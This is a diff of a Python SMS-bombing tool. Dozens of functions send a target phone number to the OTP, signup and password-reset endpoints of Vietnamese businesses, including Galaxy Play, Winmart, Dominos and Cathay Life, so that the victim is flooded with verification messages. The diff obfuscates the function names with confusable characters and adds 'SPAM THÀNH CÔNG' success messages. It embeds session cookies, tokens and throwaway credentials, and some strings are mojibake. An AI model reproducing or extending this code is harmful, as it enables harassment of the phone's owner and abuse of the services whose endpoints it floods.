+    print("OTP SEND :", response.text)
 
 
-def send_otp_via_galaxyplay(sdt):
+def WWWWWWXWXWXWXXWWW(sdt):
 
     headers = {
         'accept': '*/*',
@@ -1207,7 +1208,7 @@ def send_otp_via_galaxyplay(sdt):
     }
 
     response = requests.post('https://api.glxplay.io/account/phone/checkPhoneOnly', params=params, headers=headers)
-    print('thành Công') #("OTP SEND galaxyplay:", response.text)
+    print("OTP SEND galaxyplay:", response.text)
     headers = {
         'accept': '*/*',
         'accept-language': 'vi',
@@ -1265,12 +1266,12 @@ def send_otp_via_galaxyplay(sdt):
     }
 
     response = requests.post('https://tracker.glxplay.io/v1/event', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND galaxyplay:", response.text)
+    print("OTP SEND galaxyplay:", response.text)
 
 
 
 
-    print('thành Công') #("OTP SEND :", response.text)
+    print("OTP SEND :", response.text)
     headers = {
         'accept': '*/*',
         'accept-language': 'vi',
@@ -1295,9 +1296,9 @@ def send_otp_via_galaxyplay(sdt):
     }
 
     response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)
-    print('thành Công') #("OTP SEND galaxyplay:", response.text)
+    print("OTP SEND galaxyplay:", response.text)
 
-def send_otp_via_emartmall(sdt):
+def xxwxxxxxxxxwwwxwwwxxxxwx(sdt):
     cookies = {
         'emartsess': '30rqcrlv76osg3ghra9qfnrt43',
         'default': '7405d27b94c61015ad400e65ba',
@@ -1335,11 +1336,11 @@ def send_otp_via_emartmall(sdt):
         headers=headers,
         data=data,
     )
-    print('thành Công') #("OTP SEND emartmall:", response.text)
+    print("OTP SEND emartmall:", response.text)
 
 
 
-def send_otp_via_ahamove(sdt):
+def IllIIlIIIlIIlIIlIlI(sdt):
 
     headers = {
         'accept': 'application/json, text/plain, */*',
@@ -1365,7 +1366,7 @@ def send_otp_via_ahamove(sdt):
     }
 
     response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND ahamove:", response.text)
+    print("OTP SEND ahamove:", response.text)
 
 
 
@@ -1377,7 +1378,7 @@ def send_otp_via_ahamove(sdt):
 
 
 
-def send_otp_via_ViettelMoney(sdt):
+def xxwwwxwwwwxwxwwxxx(sdt):
 
     url = "https://api8.viettelpay.vn/customer/v2/accounts/register"
 
@@ -1404,11 +1405,11 @@ def send_otp_via_ViettelMoney(sdt):
 
     response = requests.post(url, data=payload, headers=headers)
 
-    print('thành Công') #("OTP SEND Viettel Money:", response.text)
+    print("OTP SEND Viettel Money:", response.text)
 
 
-def send_otp_via_xanhsmsms(sdt):
-        # Kiểm tra và chuyển đổi số điện thoại
+def LJJLIILLLILIJIJLLJL(sdt):
+        # Kiá»ƒm tra vÃ&nbsp; chuyá»ƒn Ä‘á»•i sá»‘ Ä‘iá»‡n thoáº¡i
     if sdt.startswith('09'):
         sdt = '+84' + sdt[1:]
     elif sdt.startswith('03'):
@@ -1440,13 +1441,13 @@ def send_otp_via_xanhsmsms(sdt):
 
     response = requests.post(url, params=params, data=payload, headers=headers)
 
-    print('thành Công') #("OTP SEND Xanh SM-SMS:", response.text)
+    print("OTP SEND Xanh SM-SMS:", response.text)
 
 
-def send_otp_via_xanhsmzalo(sdt):
+def WXWWWWXWXWXXWWXWWWXWXXXX(sdt):
 
 
-        # Kiểm tra và chuyển đổi số điện thoại
+        # Kiá»ƒm tra vÃ&nbsp; chuyá»ƒn Ä‘á»•i sá»‘ Ä‘iá»‡n thoáº¡i
     if sdt.startswith('09'):
         sdt = '+84' + sdt[1:]
     elif sdt.startswith('03'):
@@ -1480,11 +1481,11 @@ def send_otp_via_xanhsmzalo(sdt):
     response = requests.post(url, params=params, data=payload, headers=headers)
 
 
-    print('thành Công') #("OTP SEND Xanh SM-Zalo:", response.text)
+    print("OTP SEND Xanh SM-Zalo:", response.text)
 
 
 
-def send_otp_via_popeyes(sdt):
+def DOoODDDDOOoDooOODDODDDO(sdt):
 
     headers = {
         'accept': 'application/json',
@@ -1507,15 +1508,15 @@ def send_otp_via_popeyes(sdt):
 
     json_data = {
         'phone': sdt,
-        'firstName': 'Nguyễn',
-        'lastName': 'Ngọc',
+        'firstName': 'Nguyá»…n',
+        'lastName': 'Ngá»c',
         'email': 'th456do1g110@hotmail.com',
         'password': 'et_SECUREID()',
     }
 
     response = requests.post('https://api.popeyes.vn/api/v1/register', headers=headers, json=json_data)
 
-    print('thành Công') #("OTP SEND popeyes:", response.text)
+    print("OTP SEND popeyes:", response.text)
 
 
 
@@ -1533,7 +1534,7 @@ def send_otp_via_popeyes(sdt):
 
 
 
-def send_otp_via_ACHECKIN(sdt):
+def xwwwwxxxwxwwwxxwxxwxwwx(sdt):
     # Request 1
     url1 = "https://codepush.appcenter.ms/v0.1/public/codepush/update_check"
 
@@ -1542,7 +1543,7 @@ def send_otp_via_ACHECKIN(sdt):
     'app_version': "1.5",
     'package_hash': "d2673f8362359fe9129b908e7fd445482becea4d3220ed385d58cae33c7e0391",
     'label': "v39",
-    'client_unique_id': generate_random_id()
+    'client_unique_id': xxwwxwxwwwwwwxxxxxwwwxw()
     }
 
     headers1 = {
@@ -1556,7 +1557,7 @@ def send_otp_via_ACHECKIN(sdt):
     }
 
     response1 = requests.get(url1, params=params1, headers=headers1)
-    print('thành Công') #("Response ACHECKIN 1:", response1.text)
+    print("Response ACHECKIN 1:", response1.text)
 
     # Request 2
     url2 = "https://id.acheckin.vn/api/graphql/v2/mobile"
@@ -1577,7 +1578,7 @@ def send_otp_via_ACHECKIN(sdt):
     }
 
     response2 = requests.post(url2, data=payload2, headers=headers2)
-    print('thành Công') #("Response ACHECKIN 2:", response2.text)
+    print("Response ACHECKIN 2:", response2.text)
 
     # Request 3
     payload3 = json.dumps({
@@ -1591,7 +1592,7 @@ def send_otp_via_ACHECKIN(sdt):
     })
 
     response3 = requests.post(url2, data=payload3, headers=headers2)
-    print('thành Công') #("Response ACHECKIN 3:", response3.text)
+    print("Response ACHECKIN 3:", response3.text)
 
 
 
@@ -1599,7 +1600,7 @@ def send_otp_via_ACHECKIN(sdt):
 
 
 
-def send_otp_via_APPOTA(sdt):
+def IIIIIIlIIIlIIIIlIllIIIlII(sdt):
 
 
     # Request 1
@@ -1629,7 +1630,7 @@ def send_otp_via_APPOTA(sdt):
     }
 
     response1 = requests.post(url1, data=payload1, headers=headers1)
-    print('thành Công') #("Response APPOTA 1:", response1.text)
+    print("Response APPOTA 1:", response1.text)
 
     # Request 2
     url2 = "https://api.gw.ewallet.appota.com/v2/users/check_valid_fields"
@@ -1661,7 +1662,7 @@ def send_otp_via_APPOTA(sdt):
     }
 
     response2 = requests.post(url2, data=payload2, headers=headers2)
-    print('thành Công') #("Response APPOTA 2:", response2.text)
+    print("Response APPOTA 2:", response2.text)
 
     # Request 3
     url3 = "https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code"
@@ -1692,7 +1693,7 @@ def send_otp_via_APPOTA(sdt):
     }
 
     response3 = requests.post(url3, data=payload3, headers=headers3)
-    print('thành Công') #("Response APPOTA 3:", response3.text)
+    print("Response APPOTA 3:", response3.text)
 
 
 
@@ -1700,7 +1701,7 @@ def send_otp_via_APPOTA(sdt):
 
 
 
-def send_otp_via_Watsons(sdt):
+def lljjjjliiiljijljli(sdt):
 
     url = "https://www10.watsons.vn/api/v2/wtcvn/forms/mobileRegistrationForm/steps/wtcvn_mobileRegistrationForm_step1/validateAndPrepareNextStep"
 
@@ -1741,11 +1742,11 @@ def send_otp_via_Watsons(sdt):
     }
 
     response = requests.post(url, params=params, data=payload, headers=headers)
-    print('thành Công') #("OTP SEND Watsons:", response.text)
+    print("OTP SEND Watsons:", response.text)
 
 
 
-def send_otp_via_hoangphuc(sdt):
+def liljliiiijijljljl(sdt):
     cookies = {
         'form_key': 'fm7TzaicsnmIyKbm',
         'mage-banners-cache-storage': '{}',
@@ -1793,10 +1794,10 @@ def send_otp_via_hoangphuc(sdt):
     }
 
     response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', cookies=cookies, headers=headers, data=data)
-    print('thành Công') #("OTP SEND Hoàng phúc:", response.json)
+    print("OTP SEND SPAM THÀNH CÔNG", response.json)
 
 
-def send_otp_via_fmcomvn(sdt):
+def O0O0OOoOoO0oOoOOOOoo0oOOO0(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -1828,10 +1829,10 @@ def send_otp_via_fmcomvn(sdt):
 
     response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
 
-    print('thành Công') #("OTP SEND FM.COM.VN:", response.text)
+    print("OTP SEND FM.COM.VN:", response.text)
 
 
-def send_otp_via_Reebokvn(sdt):
+def NMNMMMMNMNMNMMNMNN(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi',
@@ -1860,11 +1861,11 @@ def send_otp_via_Reebokvn(sdt):
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND Reebokvn:", response.text)
+    print("OTP SEND Reebokvn:", response.text)
 
 
 
-def send_otp_via_thefaceshop(sdt):
+def DOooOoOOOODoODoooDO(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi',
@@ -1893,10 +1894,10 @@ def send_otp_via_thefaceshop(sdt):
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND thefaceshop:", response.text)
+    print("OTP SEND thefaceshop:", response.text)
 
 
-def send_otp_via_BEAUTYBOX(sdt):
+def S22SSS2SSSS22222SSS22(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi',
@@ -1925,11 +1926,11 @@ def send_otp_via_BEAUTYBOX(sdt):
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND BEAUTY BOX:", response.text)
+    print("OTP SEND BEAUTY BOX:", response.text)
 
 
 
-def send_otp_via_winmart(sdt):
+def IIIIllllIllIIIIllIIIllI(sdt):
 
     headers = {
         'accept': 'application/json',
@@ -1951,7 +1952,7 @@ def send_otp_via_winmart(sdt):
     }
 
     json_data = {
-        'firstName': 'Nguyễn Quang Ngọc',
+        'firstName': 'Nguyá»…n Quang Ngá»c',
         'phoneNumber': sdt,
         'masanReferralCode': '',
         'dobDate': '2000-02-05',
@@ -1960,9 +1961,9 @@ def send_otp_via_winmart(sdt):
 
     response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
 
-    print('thành Công') #("OTP SEND winmart:", response.text)
+    print("OTP SEND winmart:", response.text)
 
-def send_otp_via_medicare(sdt):
+def mmnmmmnmmmmmmmnmmnnmnnmm(sdt):
     headers = {
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -1989,12 +1990,12 @@ def send_otp_via_medicare(sdt):
 
     response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data)
 
-    print('thành Công') #("OTP SEND medicare:", response.text)
+    print("OTP SEND medicare:", response.text)
 
 
 
 
-def send_otp_via_futabus(sdt):
+def IIllIllIlllIlllII(sdt):
 
     headers = {
         'accept': 'application/json',
@@ -2023,11 +2024,11 @@ def send_otp_via_futabus(sdt):
 
     response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)
 
-    print('thành Công') #("OTP SEND futabus:", response.text)
+    print("OTP SEND futabus:", response.text)
 
 
 
-def send_otp_via_ViettelPost(sdt):
+def mmnnmnmnnmmmnnmnmmmmm(sdt):
     headers = {
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -2049,21 +2050,21 @@ def send_otp_via_ViettelPost(sdt):
     }
 
     data = {
-        'FormRegister.FullName': 'Nguyễn Quang Ngọc',
+        'FormRegister.FullName': 'Nguyá»…n Quang Ngá»c',
         'FormRegister.Phone': sdt,
         'FormRegister.Password': 'BEAUTYBOX12a@',
         'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
-        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt',
+        'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&amp;secret=vtp-web&amp;scope=openid%20profile%20se-public-api%20offline_access&amp;response_type=id_token%20token&amp;state=abc&amp;redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&amp;nonce=3r25st1hpummjj42ig7zmt',
         'ConfirmOtpType': 'Register',
         'FormRegister.IsRegisterFromPhone': 'true',
         '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
     }
 
     response = requests.post('https://id.viettelpost.vn/Account/SendOTPByPhone', headers=headers, data=data)
-    print('thành Công') #("OTP SEND ViettelPost: oke đã gửi")
+    print("OTP SEND ViettelPost: SPAM THÀNH CÔNG")
 
 
-def send_otp_via_myviettel2(sdt):
+def lIIlllIIIllIIIlIIIIIll(sdt):
     headers = {
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -2091,9 +2092,9 @@ def send_otp_via_myviettel2(sdt):
     }
 
     response = requests.post('https://viettel.vn/api/get-otp-contract-mobile', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND myviettel 2:", response.text)
+    print("OTP SEND myviettel 2:", response.text)
 
-def send_otp_via_myviettel3(sdt):
+def jijjlljjjijjiiijjiilii(sdt):
     cookies = {
         'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
         '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
@@ -2127,7 +2128,7 @@ def send_otp_via_myviettel3(sdt):
 
     response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
 
-def send_otp_via_TOKYOLIFE(sdt):
+def WWWXXXWWXXXWWWXWWXWXWX(sdt):
 
     headers = {
         'accept': 'application/json, text/plain, */*',
@@ -2150,7 +2151,7 @@ def send_otp_via_TOKYOLIFE(sdt):
 
     json_data = {
         'phone_number': sdt,
-        'name': 'Nguyễn Quang Ngọc',
+        'name': 'Nguyá»…n Quang Ngá»c',
         'password': 'pUL3.GFSd4MWYXp',
         'email': 'reggg10tb@gmail.com',
         'birthday': '2002-03-12',
@@ -2158,10 +2159,10 @@ def send_otp_via_TOKYOLIFE(sdt):
     }
 
     response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND TOKYOLIFE:", response.text)
+    print("OTP SEND TOKYOLIFE:", response.text)
 
 
-def send_otp_via_30shine(sdt):
+def XXWWXWWWXXWXWXXXXXW(sdt):
 
     headers = {
         'accept': 'application/json',
@@ -2190,59 +2191,104 @@ def send_otp_via_30shine(sdt):
         headers=headers,
         json=json_data,
     )
-    print('thành Công') #("OTP SEND 30shine:", response.text)
+    print("OTP SEND 30shine:", response.text)
 
 
-def send_otp_via_Cathaylife(sdt):
+def IJIILJILJLLLJJLLJLJILII(sdt):
     cookies = {
-        'JSESSIONID': 'ZbYymlmg5m-a2C3zpbQd4SV7.06283f0e-f7d1-36ef-bc27-6779aba32e74',
-        'TS01f67c5d': '0110512fd7eb22da3339fa3fbb5e9465d2ef5c0648aaabeeceb4d6600a1b6a8d437905e3288d3b293c9d9c4b7822fdf368f14de57e',
-        'BIGipServerB2C_http': '!8gwNGHCkHttqM67RrhDcHTnwa9KJ8co1rTJtwxa4VlraYj9EKcpm2F5VRwfO1cjdua8ssBafXSDY',
-        'INITSESSIONID': '17a2a67911c35286a1001df0ae265f0d',
-        'TS0173f952': '0110512fd7c0a5b00de3f3a69c4bb3fc1c29da110652a5c2f067974b704eb4fa34ea6db340c1bd0c188cb46e806add52b4c6094bc5',
+        'JSESSIONID': 'ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74',
+        'TS01f67c5d': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
+        'BIGipServerB2C_http': '!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==',
+        'TS0173f952': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
+        'TSPD_101': '085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0',
+        'INITSESSIONID': 'e0266dc6478152a4358bd3d4ae77bde0',
     }
 
     headers = {
         'Accept': 'application/json, text/javascript, */*; q=0.01',
-        'Accept-Language': 'vi-VN,vi;q=0.9,en-GB;q=0.8,en;q=0.7,fr-FR;q=0.6,fr;q=0.5,en-US;q=0.4',
+        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
         'Connection': 'keep-alive',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'Cookie': 'JSESSIONID=ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74; TS01f67c5d=0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67; BIGipServerB2C_http=!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==; TS0173f952=0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67; TSPD_101=085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0; INITSESSIONID=e0266dc6478152a4358bd3d4ae77bde0',
+        'DNT': '1',
         'Origin': 'https://www.cathaylife.com.vn',
         'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
         'Sec-Fetch-Dest': 'empty',
         'Sec-Fetch-Mode': 'cors',
         'Sec-Fetch-Site': 'same-origin',
-        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
         'X-Requested-With': 'XMLHttpRequest',
-        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
+        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
     }
 
     data = {
-        'memberMap': f'{{"userName":"heovi823n@gmail.com","password":"ayayayayay11","birthday":"16/08/1996","certificateNumber":"034202008372","phone":"{sdt}","email":"heovinh08@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyễn Quang Ngọc"}}',
+        'memberMap': f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{sdt}","email":"rancellramseyis792@gmail.com","LINK_FROM":"signUp2","memberID":"","CUSTOMER_NAME":"Nguyá»…n Quang Ngá»c"}}',
         'OTP_TYPE': 'P',
         'LANGS': 'vi_VN',
     }
 
+    response = requests.post(
+        'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
+        cookies=cookies,
+        headers=headers,
+        data=data,
+    )
+
+    print("OTP SEND Cathay life:", response.text)
+
+def SS2S22SSSS2S2SS22SSS(sdt):
+
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi',
+        'content-type': 'application/json',
+        'dmn': 'DSNKFN',
+        'dnt': '1',
+        'origin': 'https://dominos.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://dominos.vn/',
+        'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
+    }
+
+    json_data = {
+        'phone_number': sdt,
+        'email': 'rancellramseyis792@gmail.com',
+        'type': 0,
+        'is_register': True,
+    }
+
+    # Cáº¥u hÃ¬nh thá»­ láº¡i vá»›i Retry vÃ&nbsp; HTTPAdapter
+    retry_strategy = Retry(
+        total=3,
+        status_forcelist=[429, 500, 502, 503, 504],
+        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
+        backoff_factor=1
+    )
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    http = requests.Session()
+    http.mount("https://", adapter)
+    http.mount("http://", adapter)
+
     try:
-        response = requests.post(
-            'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
-            cookies=cookies,
-            headers=headers,
-            data=data,
-        )
-        response.raise_for_status()  # Kiểm tra xem có lỗi HTTP nào không
-        print("OTP SEND Cathay life:", response.text)
-    except requests.exceptions.HTTPError as http_err:
-        print(f'HTTP error occurred: {http_err}')  # Xử lý lỗi HTTP cụ thể
-    except Exception as err:
-        print(f'Other error occurred: {err}')  # Xử lý các lỗi khác
+        response = http.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data, timeout=10, stream=False)
+        response.raise_for_status()  # Äáº£m báº£o ráº±ng má»i lá»—i HTTP Ä‘Æ°á»£c nÃ¢ng lÃªn
+        print("OTP SEND dominos:", response.text)
+    except requests.exceptions.ChunkedEncodingError:
+        print("OTP SEND dominos: ÄÃ£ xáº£y ra lá»—i mÃ£ hÃ³a Chunked, nhÆ°ng OTP cÃ³ thá»ƒ Ä‘Ã£ Ä‘Æ°á»£c gá»­i.")
+    except requests.exceptions.RequestException as e:
+        print("Error occurred:", e)
 
 
-
-
-def send_otp_via_vinamilk(sdt):
+def mmnmnnmnnnmmmnmmmnmnnmm(sdt):
     headers = {
         'accept': '*/*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -2264,10 +2310,10 @@ def send_otp_via_vinamilk(sdt):
     data = f'{{"type":"register","phone":"{sdt}"}}'
 
     response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', headers=headers, data=data)
-    print('thành Công') #("OTP SEND vinamilk:", response.text)
+    print("OTP SEND vinamilk:", response.text)
 
 
-def send_otp_via_vietloan2(sdt):
+def MMNNNMMMMMNNNNNNMNNNMMM(sdt):
     cookies = {
     '_fbp': 'fb.1.1720102725444.358598086701375218',
     '_gcl_au': '1.1.619229570.1720102726',
@@ -2328,7 +2374,7 @@ def send_otp_via_vietloan2(sdt):
 
     response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
 
-def send_otp_via_batdongsan(sdt):
+def MMNMMMMMMNNMNMMNNMMM(sdt):
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -2354,11 +2400,11 @@ def send_otp_via_batdongsan(sdt):
         params=params,
         headers=headers,
     )
-    print('thành Công') #("OTP SEND batdongsan:", response.text)
+    print("OTP SEND batdongsan:", response.text)
 
 
 
-def send_otp_via_GUMAC(sdt):
+def jljijilllljjlijjjll(sdt):
     headers = {
         'Accept': 'application/json',
         'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -2381,11 +2427,11 @@ def send_otp_via_GUMAC(sdt):
     }
 
     response = requests.post('https://cms.gumac.vn/api/v1/customers/verify-phone-number', headers=headers, json=json_data)
-    print('thành Công') #("OTP SEND GUMAC:", response.text)
+    print("OTP SEND GUMAC:", response.text)
 
 
 
-def send_otp_via_mutosi(sdt):
+def WXXXXWXWWWXWWWXXWXWXXXXXX(sdt):
     headers = {
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
@@ -2406,7 +2452,7 @@ def send_otp_via_mutosi(sdt):
     }
 
     json_data = {
-        'name': 'hà khải',
+        'name': 'hÃ&nbsp; kháº£i',
         'phone': sdt,
         'password': 'Vjyy1234@',
         'confirm_password': 'Vjyy1234@',
@@ -2414,7 +2460,7 @@ def send_otp_via_mutosi(sdt):
         'lastname': None,
         'verify_otp': 0,
         'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
-        'email': 'dđ@gmail.com',
+        'email': 'dÄ‘@gmail.com',
         'birthday': '2006-02-13',
         'accept_the_terms': 1,
         'receive_promotion': 1,
@@ -2423,11 +2469,11 @@ def send_otp_via_mutosi(sdt):
     try:
         response = requests.post('https://api-omni.mutosi.com/client/auth/register', headers=headers, json=json_data)
         response.raise_for_status()  # Raise an error for bad HTTP status codes
-        print('thành Công') #("Register Response: send_otp_via_mutosi", response.json())  # print('thành Công') # the JSON response
+        print("Register Response: send_otp_via_mutosi", response.json())  # Print the JSON response
     except requests.exceptions.RequestException as e:
-        print('thành Công') #(f"An error occurred while registering: {e}")
+        print(f"An error occurred while registering: {e}")
 
-def send_otp_via_mutosi1(sdt):
+def MMNMMNMMMNNMNNNMNNN(sdt):
     headers = {
         'Accept': 'application/json, text/plain, */*',
         'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
@@ -2456,17 +2502,17 @@ def send_otp_via_mutosi1(sdt):
     try:
         response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data)
         response.raise_for_status()  # Raise an error for bad HTTP status codes
-        print('thành Công') #("OTP Response send_otp_via_mutosi:", response.json())  # print('thành Công') # the JSON response
+        print("OTP Response send_otp_via_mutosi:", response.json())  # Print the JSON response
     except requests.exceptions.RequestException as e:
-        print('thành Công') #(f"An error occurred while sending OTP: {e}")
+        print(f"An error occurred while sending OTP: {e}")
 
 
 
 
 
 
-def send_otp_via_vietair(sdt):
-    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={sdt}'
+def WWXXWWXWWXXWWXWWWWW(sdt):
+    referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&amp;mobile={sdt}'
     
     cookies = {
         '_gcl_au': '1.1.515899722.1720625176',
@@ -2511,13 +2557,13 @@ def send_otp_via_vietair(sdt):
     try:
         response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data)
         response.raise_for_status()  # Raise an error for bad HTTP status codes
-        print('thành Công') #("Response send_otp_via_vietair(sdt):", response.json())  # print('thành Công') # the JSON response
+        print("Response send_otp_via_vietair(sdt):", response.json())  # Print the JSON response
     except requests.exceptions.RequestException as e:
-        print('thành Công') #(f"An error occurred: {e}")
+        print(f"An error occurred: {e}")
 
 
 
-def send_otp_via_FAHASA(sdt):
+def IILLILJLLLJLIJIJJ(sdt):
     cookies = {
         'frontend': '173c6828799e499e81cd64a949e2c73a',
         'frontend_cid': '7bCDwdDzwf8wpQKE',
@@ -2547,9 +2593,9 @@ def send_otp_via_FAHASA(sdt):
     }
 
     response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
-    print('thành Công') #("OTP SEND FAHASA:", response.text)
+    print("OTP SEND FAHASA:", response.text)
 
-def send_otp_via_hopiness(sdt):
+def jijiijjijllijijji(sdt):
     headers = {
         'Accept': '*/*',
         'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
@@ -2575,16 +2621,16 @@ def send_otp_via_hopiness(sdt):
     }
 
     response = requests.post('https://shopiness.vn/ajax/user', headers=headers, data=data)
-    print('thành Công') #("OTP SEND hopiness:", response.text)
+    print("OTP SEND hopiness:", response.text)
 
 
 
 
